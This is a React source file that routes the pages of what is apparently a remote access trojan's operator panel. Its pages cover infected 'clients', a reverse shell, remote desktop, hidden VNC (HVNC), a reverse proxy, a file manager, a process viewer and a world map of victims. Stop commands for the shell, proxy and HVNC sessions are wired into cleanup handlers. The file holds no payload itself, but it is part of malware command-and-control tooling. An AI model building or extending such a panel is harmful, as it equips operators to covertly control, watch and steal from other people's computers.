import { Routes, Route } from "react-router-dom";
import { Layout } from "./Layout";

import { RATProvider } from "./rat/RATProvider";

import { Logs } from "./pages/Logs";
import { Clients } from "./pages/Clients";
import { Settings } from "./pages/Settings";
import { RemoteDesktop } from "./pages/RemoteDesktop";
import { ProcessViewer } from "./pages/ProcessViewer";
import { ReverseShell } from "./pages/ReverseShell";
import { FileManager } from "./pages/FileManager";
import { ReverseProxy } from "./pages/ReverseProxy";
import { WindowWrapper } from "./components/WindowWrapper";
import {
  stopRemoteDesktopCmd,
  stopReverseProxyCmd,
  stopShellCmd,
  manageHVNC,
} from "./rat/RATCommands";
import { HVNC } from "./pages/HVNC";
import { WorldMap } from "./pages/WorldMap";

export const App: React.FC = () => {
  return (
    <RATProvider>
      <Routes>
        <Route
          path="/reverse-proxy/:addr"
          element={
            <WindowWrapper
              feature_cleanup={(params) => {
                if (params.addr) {
                  stopReverseProxyCmd(params.addr);
                }
              }}
            >
              <ReverseProxy />
            </WindowWrapper>
          }
        />
        <Route
          path="/remote-shell/:addr"
          element={
            <WindowWrapper
              feature_cleanup={(params) => {
                if (params.addr) {
                  stopShellCmd(params.addr);
                }
              }}
            >
              <ReverseShell />
            </WindowWrapper>
          }
        />
        <Route
          path="/remote-desktop/:addr"
          element={
            <WindowWrapper
              feature_cleanup={(params) => {
                if (params.addr) {
                  stopRemoteDesktopCmd(params.addr);
                }
              }}
            >
              <RemoteDesktop />
            </WindowWrapper>
          }
        />
        <Route
          path="/process-viewer/:addr"
          element={
            <WindowWrapper
              feature_cleanup={() => {
                // No cleanup needed
              }}
            >
              <ProcessViewer />
            </WindowWrapper>
          }
        />
        <Route
          path="/file-manager/:addr"
          element={
            <WindowWrapper
              feature_cleanup={() => {
                // No cleanup needed
              }}
            >
              <FileManager />
            </WindowWrapper>
          }
        />
        <Route
          path="/hvnc/:addr"
          element={
            <WindowWrapper
              feature_cleanup={(params) => {
                if (params.addr) {
                  manageHVNC(params.addr, "stop");
                }
              }}
            >
              <HVNC />
            </WindowWrapper>
          }
        />
        <Route path="/" element={<Layout />}>
          <Route path="/" element={<Clients />} />
          <Route path="/logs" element={<Logs />} />
          <Route path="/worldmap" element={<WorldMap />} />
          <Route path="/settings" element={<Settings />} />
        </Route>
      </Routes>
    </RATProvider>
  );
};
